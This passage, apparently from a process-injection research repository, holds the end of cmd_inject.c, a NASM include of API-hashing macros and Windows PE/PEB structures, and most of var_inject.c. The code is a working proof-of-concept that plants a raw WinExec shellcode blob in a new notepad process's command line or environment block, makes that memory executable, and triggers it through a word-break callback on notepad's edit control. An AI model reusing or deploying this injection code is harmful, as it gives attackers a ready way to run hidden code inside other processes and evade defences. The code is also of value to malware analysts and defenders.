    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
    
    // get the address of command line in new process
    // which contains our shellcode
    cmdline = get_cmdline(pi.hProcess, &len);
    
    // set the address to RWX
    if(!VirtualProtectEx(pi.hProcess, cmdline, 
      len, PAGE_EXECUTE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RWX)");
      goto cleanup;
    }
    
    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)cmdline);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
    // set command line to RW
    if(!VirtualProtectEx(pi.hProcess, cmdline, 
      len, PAGE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RW)");
    }
cleanup:

    if(pi.hProcess != NULL) {
      //TerminateProcess(pi.hProcess, 0);
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
    }
}

int main(void) {
    WCHAR **argv;
    int   argc;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if(argc != 2) {
      printf("usage: cmd_inject <command>\n");
      return 0;
    }
    
    cmd_inject(argv[1]);
    
    return 0;
}

```

`cmdline/include.inc`:

```inc
;
;  Copyright © 2019 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

%ifndef INCLUDE_H
%define INCLUDE_H

    %define ROL_N 8

    ; http://www.asmcommunity.net/forums/topic/?id=16924
    ; originally by Vecna/29a, converted to NASM syntax by Jibz
    %macro HASH 1.nolist
      %assign %%h 0
      %strlen %%len %1
      %assign %%i 1
      %rep %%len
        %substr %%c %1 %%i
        %assign %%h ((%%h + %%c) & 0FFFFFFFFh)
        %assign %%h ((%%h << ROL_N) & 0FFFFFFFFh) | (%%h >> (32-ROL_N))
        ;%assign %%h ((%%h ^ %%c) & 0FFFFFFFFh)
        %assign %%i (%%i+1)
      %endrep
      %assign %%h ((%%h << ROL_N) & 0FFFFFFFFh) | (%%h >> (32-ROL_N))
      dd %%h
    %endmacro

    ; mov eax, HASH "string"
    %macro hmov 1.nolist
      db 0B8h
      HASH %1
    %endmacro

    %macro crc32_call 3
      %assign %%h 0            ; h = 0
      %strlen %%len %1         ; len = strlen(str)
      %assign %%s 1            ; s = str
      
      ; first, hash the DLL name
      %rep %%len
        %substr %%c %1 %%s                     ; c = *str
        %assign %%c (%%c | 0x20)               ; c = (c | 0x20)
        %assign %%b (%%c + (%%h & 0xFF))
        %assign %%h (%%h >> 8)
        %rep 8
          %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF)  
        %endrep
        %assign %%h (%%h ^ %%b)
        %assign %%s (%%s + 1)
      %endrep
      
      %assign %%dll_h %%h

      %assign %%h 0
      %strlen %%len %2
      %assign %%s 1
      
      ; then the api
      %rep %%len
        %substr %%c %2 %%s
        %assign %%c (%%c | 0x20)
        %assign %%b (%%c ^ (%%h & 0xFF))
        %assign %%h (%%h >> 8)    
        %rep 8
          %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF) 
        %endrep
        %assign %%h (%%h ^ %%b)
        %assign %%s (%%s + 1)
      %endrep
      
      mov  cl, %3 
      db   0b8h
      dd   (%%dll_h + %%h) & 0xFFFFFFFF
    %endmacro
    
    %macro cmpms 1.nolist
      %assign %%h 0  
      %strlen %%len %1
      %assign %%i 1
      
      %rep %%len
        %substr %%c %1 %%i
        %assign %%h ((%%h >> 8) & 0FFFFFFFFh) | (%%h << (32 - 8))
        %assign %%c (%%c | 0x20)    
        %assign %%h ((%%h + %%c) & 0FFFFFFFFh)
        %assign %%i (%%i+1)
      %endrep
      ; cmp edx, hash  
      db 081h, 0fah
      dd %%h
    %endmacro

    %macro lookup 2
      %assign %%h 0            ; h = 0
      %strlen %%len %1         ; len = strlen(str)
      %assign %%s 1            ; s = str
      
      ; first, hash the DLL name
      %rep %%len
        %substr %%c %1 %%s                     ; c = *str
        %assign %%c (%%c | 0x20)               ; c = (c | 0x20)
        %assign %%h ((%%c + %%h) & 0FFFFFFFFh)
        %assign %%h ((%%h >> 8) & 0FFFFFFFFh) | (((%%h << (32 - 8)) & 0FFFFFFFFh))
        %assign %%s (%%s + 1)
      %endrep
      
      %assign %%dll_h %%h

      %assign %%h 0
      %strlen %%len %2
      %assign %%s 1
      
      ; then the api
      %rep %%len
        %substr %%c %2 %%s                     ; c = *str
        %assign %%c (%%c | 0x20)               ; c = (c | 0x20)
        %assign %%h ((%%c + %%h) & 0FFFFFFFFh)
        %assign %%h ((%%h >> 8) & 0FFFFFFFFh) | (((%%h << (32 - 8)) & 0FFFFFFFFh))
        %assign %%s (%%s + 1)
      %endrep

      db   0b8h
      dd   (%%dll_h + %%h) & 0xFFFFFFFF
      
      %ifdef X86
        call ebp
      %else
        call rbp
      %endif
    %endmacro
    
    %macro  pushx 1-*
        %rep  %0
          push    %1
        %rotate 1
        %endrep
    %endmacro

    %macro  popx 1-*
        %rep %0
        %rotate -1
          pop     %1
        %endrep
    %endmacro

%define SOCK_STREAM       1    
%define AF_INET           2

%define SW_HIDE           0
%define SW_SHOWNORMAL     1
%define SW_SHOWMINIMIZED  2
%define SW_SHOWMAXIMIZED  3
%define SW_SHOWNOACTIVATE 4
%define SW_SHOW           5

%define PAGE_NOACCESS 0x01
%define PAGE_READONLY 0x02
%define PAGE_READWRITE 0x04
%define PAGE_WRITECOPY 0x08
%define PAGE_EXECUTE 0x10
%define PAGE_EXECUTE_READ 0x20
%define PAGE_EXECUTE_READWRITE 0x40
%define PAGE_EXECUTE_WRITECOPY 0x80
%define PAGE_GUARD 0x100
%define PAGE_NOCACHE 0x200
%define PAGE_WRITECOMBINE 0x400

%define MEM_COMMIT 0x1000
%define MEM_RESERVE 0x2000
%define MEM_DECOMMIT 0x4000
%define MEM_RELEASE 0x8000
%define MEM_FREE 0x10000
%define MEM_PRIVATE 0x20000
%define MEM_MAPPED 0x40000
%define MEM_RESET 0x80000
%define MEM_TOP_DOWN 0x100000
%define INFINITE -1

%define DLL_PROCESS_ATTACH                    1
%define CRYPT_STRING_BASE64                   1
%define CRYPT_STRING_ANY                      7

%define IMAGE_DIRECTORY_ENTRY_EXPORT          0   ; Export Directory
%define IMAGE_DIRECTORY_ENTRY_IMPORT          1   ; Import Directory
%define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   ; Resource Directory
%define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   ; Exception Directory
%define IMAGE_DIRECTORY_ENTRY_SECURITY        4   ; Security Directory
%define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   ; Base Relocation Table
%define IMAGE_DIRECTORY_ENTRY_DEBUG           6   ; Debug Directory
%define IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   ; (X86 usage)
%define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   ; Architecture Specific Data
%define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   ; RVA of GP
%define IMAGE_DIRECTORY_ENTRY_TLS             9   ; TLS Directory
%define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   ; Load Configuration Directory
%define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   ; Bound Import Directory in headers
%define IMAGE_DIRECTORY_ENTRY_IAT            12   ; Import Address Table
%define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   ; Delay Load Import Descriptors
%define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   ; COM Runtime descriptor

struc IMAGE_DOS_HEADER
    .e_magic      resw 1
    .e_cblp       resw 1
    .e_cp         resw 1
    .e_crlc       resw 1
    .e_cparhdr    resw 1
    .e_minalloc   resw 1
    .e_maxalloc   resw 1
    .e_ss         resw 1
    .e_sp         resw 1
    .e_csum       resw 1
    .e_ip         resw 1
    .e_cs         resw 1
    .e_lfarlc     resw 1
    .e_ovno       resw 1
    .e_res        resw 4
    .e_oemid      resw 1
    .e_oeminfo    resw 1
    .e_res2       resw 10
    .e_lfanew     resd 1
endstruc

struc IMAGE_FILE_HEADER
    .Machine                      resw 1
    .NumberOfSections             resw 1
    .TimeDateStamp                resd 1
    .PointerToSymbolTable         resd 1
    .NumberOfSymbols              resd 1
    .SizeOfOptionalHeader         resw 1
    .Characteristics              resw 1
endstruc

struc IMAGE_OPTIONAL_HEADER
    .Magic                        resw 1
    .MajorLinkerVersion           resb 1
    .MinorLinkerVersion           resb 1
    
    .SizeOfCode                   resd 1
    .SizeOfInitializedData        resd 1
    .SizeOfUninitializedData      resd 1
    .AddressOfEntryPoint          resd 1
    .BaseOfCode                   resd 1
%ifdef X86
    .BaseOfData                   resd 1
    .ImageBase                    resd 1
%else
    .ImageBase                    resq 1
%endif
    .SectionAlignment             resd 1
    .FileAlignment                resd 1
    
    .MajorOperatingSystemVersion  resw 1
    .MinorOperatingSystemVersion  resw 1
    .MajorImageVersion            resw 1
    .MinorImageVersion            resw 1
    .MajorSubsystemVersion        resw 1
    .MinorSubsystemVersion        resw 1
    
    .Win32VersionValue            resd 1
    .SizeOfImage                  resd 1
    .SizeOfHeaders                resd 1
    .CheckSum                     resd 1
    
    .Subsystem                    resw 1
    .DllCharacteristics           resw 1
%ifdef X86    
    .SizeOfStackReserve           resd 1
    .SizeOfStackCommit            resd 1
    .SizeOfHeapReserve            resd 1
    .SizeOfHeapCommit             resd 1
%else
    .SizeOfStackReserve           resq 1
    .SizeOfStackCommit            resq 1
    .SizeOfHeapReserve            resq 1
    .SizeOfHeapCommit             resq 1
%endif
    .LoaderFlags                  resd 1
    .NumberOfRvaAndSizes          resd 1
    .DataDirectory                resb 0
endstruc

struc IMAGE_NT_HEADERS
    .Signature                   resd 1
    .FileHeader                  resb IMAGE_FILE_HEADER_size
    .OptionalHeader              resb IMAGE_OPTIONAL_HEADER_size
endstruc

struc IMAGE_SECTION_HEADER
    .Name                  resb 8
    .VirtualSize           resd 1
    .VirtualAddress        resd 1
    .SizeOfRawData         resd 1
    .PointerToRawData      resd 1
    .PointerToRelocations  resd 1
    .PointerToLinenumbers  resd 1
    .NumberOfRelocations   resw 1
    .NumberOfLinenumbers   resw 1
    .Characteristics       resd 1
endstruc

struc IMAGE_IMPORT_DESCRIPTOR
    .OriginalFirstThunk    resd 1
    .TimeDateStamp         resd 1
    .ForwarderChain        resd 1
    .Name                  resd 1
    .FirstThunk            resd 1
endstruc

struc IMAGE_DATA_DIRECTORY
    .VirtualAddress:        resd 1
    .Size:                  resd 1
endstruc

struc IMAGE_EXPORT_DIRECTORY
    .Characteristics       resd 1
    .TimeDateStamp         resd 1
    .MajorVersion          resw 1
    .MinorVersion          resw 1
    .Name                  resd 1
    .Base                  resd 1
    .NumberOfFunctions     resd 1
    .NumberOfNames         resd 1
    .AddressOfFunctions    resd 1
    .AddressOfNames        resd 1
    .AddressOfNameOrdinals resd 1
endstruc                                   

struc IMAGE_IMPORT_BY_NAME
    .Hint                   resw 1
    .Name                   resb 1
endstruc

%ifdef X86

struc pushad_t
    ._edi                    resd 1
    ._esi                    resd 1
    ._ebp                    resd 1
    ._esp                    resd 1
    ._ebx                    resd 1
    ._edx                    resd 1
    ._ecx                    resd 1
    ._eax                    resd 1
endstruc

; ########################################################
; 32-bit structures
struc LIST_ENTRY
    .Flink                           resd 1
    .Blink                           resd 1
endstruc

struc UNICODE_STRING
    .Length                          resw 1
    .MaximumLength                   resw 1
    .Buffer                          resd 1
endstruc

struc PEB_LDR_DATA
    .Length                          resd 1
    .Initialized                     resd 1   ; BYTE padded to DWORD
    .SsHandle                        resd 1
    .InLoadOrderModuleList           resb LIST_ENTRY_size
    .InMemoryOrderModuleList         resb LIST_ENTRY_size
    .InInitializationOrderModuleList resb LIST_ENTRY_size
endstruc

struc PEB
    .InheritedAddressSpace           resb 1
    .ReadImageFileExecOptions        resb 1
    .BeingDebugged                   resb 1
    .SYSTEM_DEPENDENT_01             resb 1
    .Mutant                          resd 1
    .ImageBaseAddress                resd 1
    .Ldr                             resd 1
endstruc

struc LDR_DATA_TABLE_ENTRY
    .InLoadOrderLinks                resb LIST_ENTRY_size
    .InMemoryOrderLinks              resb LIST_ENTRY_size
    .InInitializationOrderLinks      resb LIST_ENTRY_size
    .DllBase                         resd 1
    .EntryPoint                      resd 1
    .SizeOfImage                     resd 1
    .FullDllName                     resb UNICODE_STRING_size
    .BaseDllName                     resb UNICODE_STRING_size
endstruc

struc NT_TIB
    .ExceptionList                   resd 1
    .StackBase                       resd 1
    .StackLimit                      resd 1
    .SubSystemTib                    resd 1
    .FiberData                       resd 1  ; Version
    .ArbitraryUserPointer            resd 1
    .Self                            resd 1  ; PNT_TIB
endstruc

struc CLIENT_ID
    .UniqueProcess                   resd 1
    .UniqueThread                    resd 1
endstruc

struc TEB
    .NtTib                           resb NT_TIB_size
    .EnvironmentPointer              resd 1
    .ClientId                        resb CLIENT_ID_size
    .ActiveRpcHandle                 resd 1
    .ThreadLocalStoragePointer       resd 1
    .ProcessEnvironmentBlock         resd 1  ; PPEB
endstruc

%define NULL           0x00000000
%define S_OK           0x00000000
%define E_UNEXPECTED   0x8000FFFF
%define E_NOTIMPL      0x80004001
%define E_OUTOFMEMORY  0x8007000E
%define E_INVALIDARG   0x80070057
%define E_NOINTERFACE  0x80004002
%define E_POINTER      0x80004003
%define E_HANDLE       0x80070006
%define E_ABORT        0x80004004
%define E_FAIL         0x80004005
%define E_ACCESSDENIED 0x80070005
%define E_PENDING      0x8000000A
        
%define CLSCTX_INPROC_SERVER      1
%define CLSCTX_INPROC_HANDLER     2
%define CLSCTX_LOCAL_SERVER       4
%define CLSCTX_REMOTE_SERVER     10
%define COINIT_APARTMENTTHREADED  0x2
%define COINIT_MULTITHREADED      0x0
%define COINIT_DISABLE_OLE1DDE    0x4
%define COINIT_SPEED_OVER_MEMORY  0x8
  
; SCRIPTSTATE
%define SCRIPTSTATE_UNINITIALIZED 0
%define SCRIPTSTATE_STARTED       1
%define SCRIPTSTATE_CONNECTED     2
%define SCRIPTSTATE_DISCONNECTED  3
%define SCRIPTSTATE_CLOSED        4
%define SCRIPTSTATE_INITIALIZED   5

; SCRIPTTHREADSTATE
%define SCRIPTTHREADSTATE_NOTINSCRIPT 0
%define SCRIPTTHREADSTATE_RUNNING     1

struc IUnknownVtbl
    .QueryInterface             resd 1 
    .AddRef                     resd 1 
    .Release                    resd 1
endstruc

struc IActiveScriptParse32Vtbl
    .IUnknownParse32            resd 3
    
    .InitNew                    resd 1 
    .AddScriptlet               resd 1
    .ParseScriptText            resd 1
endstruc

struc IActiveScriptVtbl
    .IUnknownActiveScript       resd 3
    
    .SetScriptSite              resd 1
    .GetScriptSite              resd 1
    .SetScriptState             resd 1
    .GetScriptState             resd 1
    .Close                      resd 1
    .AddNamedItem               resd 1
    .AddTypeLib                 resd 1
    .GetScriptDispatch          resd 1
    .GetCurrentScriptThreadID   resd 1
    .GetScriptThreadID          resd 1
    .GetScriptThreadState       resd 1
    .InterruptScriptThread      resd 1
    .Clone                      resd 1
enstruc
      
struc IActiveScriptSiteVtbl
    .IUnknownActiveScriptSite   resd 3
    
    .GetLCID                    resd 1
    .GetItemInfo                resd 1
    .GetDocVersionString        resd 1
    .OnScriptTerminate          resd 1
    .OnStateChange              resd 1
    .OnScriptError              resd 1
    .OnEnterScript              resd 1
    .OnLeaveScript              resd 1
endstruc

%else
; ##############################################################
; 64-bit structures
struc LIST_ENTRY
    .Flink                           resq 1
    .Blink                           resq 1
endstruc

struc UNICODE_STRING
    .Length                          resw 1
    .MaximumLength                   resw 1
    .padding                         resb 4
    .Buffer                          resq 1
endstruc

struc PEB_LDR_DATA
    .Length                          resd 1
    .Initialized                     resd 1   ; BYTE padded to DWORD
    .SsHandle                        resq 1
    .InLoadOrderModuleList           resb LIST_ENTRY_size
    .InMemoryOrderModuleList         resb LIST_ENTRY_size
    .InInitializationOrderModuleList resb LIST_ENTRY_size
endstruc

struc PEB
    .InheritedAddressSpace           resb 1
    .ReadImageFileExecOptions        resb 1
    .BeingDebugged                   resb 1
    .BitField                        resb 1
    .Padding0                        resb 4
    .Mutant                          resq 1
    .ImageBaseAddress                resq 1
    .Ldr                             resq 1
endstruc

struc LDR_DATA_TABLE_ENTRY
    .InLoadOrderLinks                resb LIST_ENTRY_size
    .InMemoryOrderLinks              resb LIST_ENTRY_size
    .InInitializationOrderLinks      resb LIST_ENTRY_size
    .DllBase                         resq 1
    .EntryPoint                      resq 1
    .SizeOfImage                     resd 1
    .Padding                         resd 1
    .FullDllName                     resb UNICODE_STRING_size
    .BaseDllName                     resb UNICODE_STRING_size
endstruc

struc NT_TIB
    .ExceptionList                   resq 1  
    .StackBase                       resq 1 
    .StackLimit                      resq 1   
    .SubSystemTib                    resq 1   
    .FiberData                       resq 1  
    .ArbitraryUserPointer            resq 1 
    .Self                            resq 1  
endstruc

struc CLIENT_ID
    .UniqueProcess                   resq 1
    .UniqueThread                    resq 1
endstruc

struc TEB
    .NtTib                           resb NT_TIB_size
    .EnvironmentPointer              resq 1
    .ClientId                        resb CLIENT_ID_size
    .ActiveRpcHandle                 resq 1
    .ThreadLocalStoragePointer       resq 1
    .ProcessEnvironmentBlock         resq 1  ; PPEB
endstruc

struc home_space
  ._rcx resq 1
  ._rdx resq 1
  ._r8  resq 1
  ._r9  resq 1
endstruc

struc PROCESS_INFORMATION
  .hProcess             resd 1
  .hThread              resd 1
  .dwProcessId          resd 1
  .dwThreadId           resd 1
endstruc

struc STARTUPINFO
  .cb                   resd 1
  .padding0             resd 1
  .lpReserved           resq 1
  .lpDesktop            resq 1
  .lpTitle              resq 1 
  .dwX                  resd 1 
  .dwY                  resd 1 
  .dwXSize              resd 1
  .dwYSize              resd 1
  .dwXCountChars        resd 1
  .dwYCountChars        resd 1
  .dwFillAttribute      resd 1
  .dwFlags              resd 1
  .wShowWindow          resw 1
  .cbReserved2          resw 1
  .padding1             resd 1
  .lpReserved2          resq 1
  .hStdInput            resq 1
  .hStdOutput           resq 1
  .hStdError            resq 1
endstruc

%endif

%endif


```

`cmdline/var_inject.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

#define MAX_VALUE_LEN 32767 // 0x7FFF
#define MAX_NAME_LEN 16

// return relative virtual address of environment variable value
DWORD get_var_rva(PWCHAR name) {
    PVOID  env;
    PWCHAR str, var;
    DWORD  rva = 0;
    
    // find the offset of value for environment variable
    env = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment;
    str = (PWCHAR)env;
    
    while(*str != 0) {
      // our name?
      if(wcsncmp(str, name, MAX_NAME_LEN) == 0) {
        var = wcsstr(str, L"=") + 1;
        // calculate RVA of value
        rva = (PBYTE)var - (PBYTE)env;
        break;
      }
      // advance to next entry
      str += wcslen(str) + 1;
    }
    return rva;
}

// get the address of environment variable value
PVOID var_get_env(HANDLE hp, PDWORD envlen) {
    NTSTATUS                    nts;
    PROCESS_BASIC_INFORMATION   pbi;
    RTL_USER_PROCESS_PARAMETERS upp;
    PEB                         peb;
    ULONG                       len;
    SIZE_T                      rd;

    // get the address of PEB
    nts = NtQueryInformationProcess(
        hp, ProcessBasicInformation,
        &pbi, sizeof(pbi), &len);
    
    // get the address RTL_USER_PROCESS_PARAMETERS
    ReadProcessMemory(
      hp, pbi.PebBaseAddress,
      &peb, sizeof(PEB), &rd);
    
    // get the address of Environment block 
    ReadProcessMemory(
      hp, peb.ProcessParameters,
      &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);

    *envlen = upp.EnvironmentSize;
    return upp.Environment;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

void var_inject(PWCHAR cmd) {
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               name[MAX_PATH]={0};    
    INT                 i; 
    PVOID               va;
    DWORD               rva, old, len;
    PVOID               env;
    HWND                npw, ecw;

    // generate random name
    srand(time(0));
    for(i=0; i<MAX_NAME_LEN; i++) {
      name[i] = ((rand() % 2) ? L'a' : L'A') + (rand() % 26);
    }
    
    // set variable in this process space with our shellcode
    SetEnvironmentVariable(name, (PWCHAR)WINEXEC);
    
    // create a new process using 
    // environment variables from this process
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWDEFAULT;
    
    // doesn't seem to work if created in suspended mode
    if(!CreateProcess(NULL, L"notepad", NULL, NULL, 
      FALSE, 0, NULL, NULL, &si, &pi))
    {
      xstrerror(L"CreateProcess");
      goto cleanup;
    }
     
    // wait for process to initialize
    // if you don't wait, there can be a race condition
    // reading the correct Environment address from new process    
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // the command to execute is just pasted into the notepad
    // edit control.
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
    
    // get the address of environment block in new process
    // then calculate the address of shellcode
    env = var_get_env(pi.hProcess, &len);
    va = (PBYTE)env + get_var_rva(name);

    // set environment block to RWX
    if(!VirtualProtectEx(pi.hProcess, env, 
      len, PAGE_EXECUTE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RWX)");
      goto cleanup;
    }
    
